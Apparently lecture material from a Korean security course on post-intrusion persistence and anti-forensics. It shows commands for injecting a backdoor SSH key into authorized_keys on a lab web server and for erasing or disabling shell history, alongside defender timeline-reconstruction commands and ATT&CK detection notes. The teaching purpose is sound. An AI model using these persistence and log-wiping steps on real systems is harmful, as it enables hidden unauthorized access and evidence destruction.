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지속성 확보 + 흔적 제거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침투 후 지속성(Persistence) 확보 기법의 종류와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SSH 키 인젝션, cron 백도어, 시작 스크립트 등의 기법을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안티포렌식(Anti-Forensics) 기법을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로그 삭제, 히스토리 제거, 타임라인 조작 방법을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방어자 관점에서 타임라인 재구성 방법을 학습한다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지속성(Persistence)이란?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패스워드가 변경되더라도 접근 유지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취약점이 패치되더라도 이미 확보한 경로로 재접속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장기간 정보 수집을 위한 안정적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초기 침투 → 권한 상승 → [지속성 확보] → 재접속 가능 상태 유지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├─ SSH 키 인젝션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├─ Cron 백도어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├─ 시작 스크립트 수정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├─ 사용자 계정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└─ 웹쉘 설치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지속성 확보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`authorized_keys` 파일의 최근 수정 시간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알 수 없는 공개키 존재 여부 점검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`crontab -l`로 모든 사용자의 cron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공격자 측: SSH 키 쌍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ssh-keygen -t ed25519 -f /tmp/backdoor_key -N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→ /tmp/backdoor_key (개인키)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→ /tmp/backdoor_key.pub (공개키)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대상 서버에 공개키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/tmp/backdoor_key.pub  # 공개키 내용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대상 서버의 authorized_keys에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mkdir -p ~/.ssh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chmod 700 ~/.ssh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"ssh-ed25519 AAAA...공개키내용... backdoor" &gt;&gt; ~/.ssh/authorized_keys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chmod 600 ~/.ssh/authorized_keys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root 계정에도 추가 (권한이 있는 경우)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안티포렌식(Anti-Forensics)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1: HISTFILE 비활성화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HISTFILE=/dev/null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→ 이후 입력하는 모든 명령이 기록되지 않음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2: HISTSIZE를 0으로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HISTSIZE=0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3: 히스토리 파일 직접 삭제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/dev/null &gt; ~/.bash_history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history -c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4: 명령어 앞에 공백 추가 (HISTCONTROL=ignorespace일 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whoami     # ← 앞에 공백이 있으면 기록되지 않음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타임라인 재구성 (방어자 관점)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최근 수정된 파일 찾기 (24시간 이내)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find / -mtime -1 -type f 2&gt;/dev/null | head -30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시간 이후 수정된 파일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find / -newer /tmp/reference_file -type f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최근 생성된 사용자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-v "nologin\|false" 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접속 기록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last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lastlog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현재 접속 세션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opsclaw에서 백도어용 SSH 키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ssh-keygen -t ed25519 -f /tmp/week12_key -N "" -q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공개키 내용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/tmp/week12_key.pub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web 서버에 키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"mkdir -p ~/.ssh &amp;&amp; chmod 700 ~/.ssh"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공개키를 web 서버에 복사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PUBKEY=$(cat /tmp/week12_key.pub)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"echo '$PUBKEY' &gt;&gt; ~/.ssh/authorized_keys &amp;&amp; chmod 600 ~/.ssh/authorized_keys"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지속성 보고서: web 서버에 3가지 이상의 지속성 메커니즘을 설치하고, 각각의 원리와 탐지 방법을 설명하라. (실습 후 반드시 모두 제거)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포렌식 타임라인: 실습에서 수행한 모든 공격 활동의 타임라인을 작성하라. 로그 기반 증거를 포함할 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안티포렌식 한계: 각 안티포렌식 기법이 완벽하지 않은 이유를 설명하라. (예: 로그 삭제해도 남는 증거)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공격자는 단 하나의 지속성 경로만 남겨도 재침투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방어자는 모든 지속성 경로를 찾아 제거해야 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완벽한 흔적 제거는 불가능하다 (항상 어딘가에 흔적이 남는다)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SSH 키 인젝션 | T1098.004 | 낮음 (authorized_keys 확인)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Cron 백도어 | T1053.003 | 낮음 (crontab -l)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systemd 서비스 | T1543.002 | 중간 (많은 서비스 중 식별)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.bashrc 수정 | T1546.004 | 중간 (정상 설정과 혼재)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계정 생성 | T1136.001 | 낮음 (/etc/passwd 확인)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